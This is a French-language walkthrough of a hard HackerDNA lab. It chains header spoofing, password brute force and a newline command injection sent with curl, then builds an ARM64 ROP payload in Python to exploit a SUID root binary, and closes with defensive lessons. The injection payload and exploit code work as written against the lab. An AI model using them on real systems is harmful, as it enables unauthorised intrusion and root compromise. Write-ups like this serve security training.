# Compte rendu : Hack the Box

Plateforme : HackerDNA (https://hackerdna.com/labs/hack-the-box)
Auteur : SRH
Difficulté : Difficile
Tags : X-Forwarded-For Spoofing, Brute Force, Newline Injection, SUID Binary, ARM64 ROP, Caller Frame Overflow, ret2win
XP : +700 XP

## Scénario
Un portail d'entreprise exige une connexion depuis une IP interne et expose un outil de diagnostic réseau. Un binaire SUID ARM64 est également présent sur le système. L'objectif est d'usurper l'IP, de trouver un mot de passe faible, d'injecter des commandes via l'outil de ping, puis d'exploiter un buffer overflow pour obtenir un shell root.

Prérequis : fondamentaux HTTP, ligne de commande Linux, notions de base en exploitation binaire (ROP, ARM64), familiarité avec GDB et pwntools.

## Chaîne d'Attaque
[Reconnaissance] → [X-Forwarded-For Spoofing] → [Brute Force] → [Newline Injection] → [Découverte des credentials SSH] → [Flag User] → [ROP Chain ARM64] → [Flag Root] → 🚩

## Étape 1 — Reconnaissance
Le scan Nmap révèle les ports 22 (SSH) et 80 (HTTP). Le portail exige une IP interne pour accéder aux pages. Un scan de répertoires avec ffuf et l'en-tête X-Forwarded-For: 127.0.0.1 révèle les endpoints /login, /dashboard et /diagnostic.

## Étape 2 — Usurpation d'IP et Brute Force
Le formulaire de login est accessible en usurpant l'IP interne. Un brute force avec ffuf et rockyou.txt permet de trouver le mot de passe de l'opérateur.

## Étape 3 — Injection de Newline
L'outil de diagnostic /diagnostic prend un paramètre host passé à ping via subprocess.check_output(cmd, shell=True). Le newline (%0a) contourne le filtre de caractères et permet l'exécution de commandes arbitraires.

curl -s -b cookies.txt -H "X-Forwarded-For: 127.0.0.1" -X POST http://<IP>/diagnostic -d "host=127.0.0.1%0aid"
# → uid=33(www-data)

## Étape 4 — Credentials SSH et Flag User
L'injection permet de lire /opt/backup/.ssh_creds, qui contient les identifiants SSH de l'utilisateur developer. La connexion SSH donne accès au flag utilisateur.

ssh developer@<IP>
cat /home/developer/flag-user.txt

Flag User : <USER_FLAG>

## Étape 5 — ROP Chain ARM64 sur box (SUID root)
Le binaire /usr/local/bin/box est SUID root, non-PIE, et lit sur stdin. Il souffre d'un buffer overflow (caller frame overflow). L'offset buffer → x30 de main est de 72 octets (vérifié avec cyclic).

Le ROP chain utilise :
- system : 0x406cb0
- /bin/sh : 0x4538b8
- Gadget ldr x0, [sp, #0x68] ; ldp x29, x30, [sp], #0x80 ; ret : 0x422100

Payload final (256 octets + commandes sur stdin) :
import struct
p64 = lambda x: struct.pack('<Q', x)
payload = b'A' * 72
payload += p64(0x422100)
payload += b'C' * (104 - len(payload))
payload += p64(0x406cb0)
payload += b'D' * (200 - len(payload))
payload += p64(0x4538b8)
payload += b'E' * (256 - len(payload))
open('/tmp/payload.bin', 'wb').write(payload)

Exécution avec un délai pour laisser le shell démarrer :
( cat /tmp/payload.bin ; sleep 3 ; echo "cp /root/flag-root.txt /tmp/flag" ; echo "chmod 666 /tmp/flag" ; echo "exit" ) | /usr/local/bin/box
cat /tmp/flag

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab enchaîne plusieurs vulnérabilités : usurpation d'en-tête HTTP pour accéder au portail, brute force d'un mot de passe faible, injection de commande via newline, et exploitation d'un buffer overflow ARM64 (caller frame overflow) pour obtenir un shell root. La difficulté réside dans la construction du ROP chain et la gestion du conflit sur x30 entre le gadget et l'appel à system.

## Leçons Apprises
1. Ne jamais faire confiance à l'en-tête X-Forwarded-For pour l'authentification ou le contrôle d'accès.
2. Valider et échapper les entrées utilisateur avant de les passer à un shell (subprocess avec shell=True).
3. Ne pas laisser de fichiers de credentials accessibles sur le serveur (/opt/backup/.ssh_creds).
4. Auditer les binaires SUID : un buffer overflow dans un binaire root mène à une compromission totale.
5. En ARM64, les gadgets ldp x29, x30 écrasent x30 au même offset que l'adresse de retour de main, ce qui nécessite un placement précis des valeurs dans le payload.
